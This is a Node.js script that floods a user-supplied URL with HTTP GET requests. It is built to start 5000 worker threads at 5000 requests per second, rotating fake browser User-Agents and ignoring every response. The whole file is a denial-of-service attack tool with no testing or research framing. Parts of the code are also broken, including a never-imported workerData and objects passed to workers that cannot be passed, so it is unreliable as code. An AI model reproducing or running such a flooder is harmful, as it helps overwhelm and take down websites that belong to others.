const readline = require('readline');
const http = require('http');
const https = require('https');
const { Worker, isMainThread } = require('worker_threads');

// Define the number of requests per second
const requestsPerSecond = 5000;

// Define the number of workers
const numWorkers = 5000;

// Define the user agents and headers
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
  'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko',
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
];
const headers = {
  'Accept-Language': 'en-US,en;q=0.8',
  'Connection': 'keep-alive',
};

// Create a prompt for the URL
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
rl.question('Enter URL: ', (url) => {
  rl.close();

  if (isMainThread) {
    // Create a client with a fast HTTP agent
    const agent = new http.Agent({ keepAlive: true });
    const client = url.startsWith('https') ? https : http;

    // Start the workers
    for (let i = 0; i < numWorkers; i++) {
      new Worker(__filename, {
        workerData: { url, agent, client },
      });
    }
  } else {
    // Get the worker data
    const { url, agent, client } = workerData;

    // Create a request with a random user agent and headers
    const options = {
      agent,
      headers: {
        ...headers,
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
      },
    };
    setInterval(() => {
      client.get(url, options, (res) => {
        // Do nothing with the response
      });
    }, 1000 / requestsPerSecond);
  }
});
